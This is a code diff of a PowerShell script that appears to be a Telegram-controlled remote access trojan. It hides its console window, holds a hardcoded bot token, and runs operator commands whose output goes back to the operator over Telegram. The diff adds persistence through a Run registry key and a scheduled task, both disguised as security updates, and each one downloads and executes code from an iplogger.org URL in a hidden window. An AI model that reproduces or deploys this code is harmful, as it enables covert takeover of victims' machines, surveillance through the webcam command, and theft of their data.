@@ -5,12 +5,12 @@ public static extern IntPtr GetConsoleWindow();
 public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);'
 
 Hide-Console
-Persist
+#Persist
 #KillProc
 
 $BotToken = "1674652212:AAH7SBm8S-i1N7gCJYRlEZeyoJBg6eMwy_4"
 $ChatID = '928905258'
-$PersistPath = 'https://iplogger.org/2jaZG6'
+$PersistUrl = 'https://iplogger.org/2jaZG6'
 
 function KillProc {
   $host.UI.RawUI.WindowTitle = "System Information"
@@ -27,22 +27,18 @@ $consolePtr = [Console.Window]::GetConsoleWindow()
 [Console.Window]::ShowWindow($consolePtr, 0) 
 } 
 
+
 function Persist {
   
         reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v SecurityUpdate /f
-        reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v SecurityUpdate1 /f
+        reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v SecurityUpdate /t REG_SZ /d "powershell.exe -noni -W Hidden -nop -c iex (New-Object Net.WebClient).DownloadString('$PersistUrl')" 
         
-        Invoke-WebRequest -Uri $persistPath -OutFile C:\ProgramData\SecurityUpdate.ps1
-        
-        reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v SecurityUpdate1 /t REG_SZ /d "powershell.exe -noni -W Hidden -nop -c iex (New-Object Net.WebClient).DownloadString('https://iplogger.org/2jaZG6')" 
-
+        schtasks /delete /tn "Windows\Security\System" /f
+        schtasks /create /tn "Windows\Security\System" /sc onidle /i 10 /tr "C:\Windows\System32\cmd.exe  /c powershell.exe -noni -W Hidden -nop -c iex (New-Object Net.WebClient).DownloadString('$PersistUrl')" 
+        schtasks /run /tn "Windows\Security\System"
 
         $checkPersist = reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run | Select-String SecurityUpdate
         Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($checkPersist)" -UserAgent Edge -UseBasicParsing
-		
-        $command = cmd.exe /c "powershell.exe -windowstyle hidden -file C:\ProgramData\SecurityUpdate.ps1"
-        Invoke-Expression -Command:$command
-        #(get-item "C:\Users\$env:username\SecurityUpdate.ps1" -force).Attributes -= 'Hidden'
 }
 
 function SysInfo {
@@ -186,8 +182,6 @@ function Test {
 
 Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted
 
-
-
 ## CONNECT WITH CHANNEL ##
 
 [Net.ServicePointManager]::SecurityProtocol = 
@@ -278,6 +272,7 @@ While ($DoNotExit)  {
 		Catch  {
 		  $CommandToRun_Result = $_.Exception.Message
 		}		
+
 		$Message = "$($LastMessage.Message.from.first_name), I've ran <b>$($CommandToRun)</b> and this is the output:`n$CommandToRun_Result`n`nClient: $username"
 		$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($Message)&parse_mode=html" -UserAgent Edge -UseBasicParsing
 	  }
@@ -342,7 +337,7 @@ While ($DoNotExit)  {
         Webcam
       }
       "/test"{
-        Test
+        Task
       }
 	  default  {
 	    #The message sent is unknown
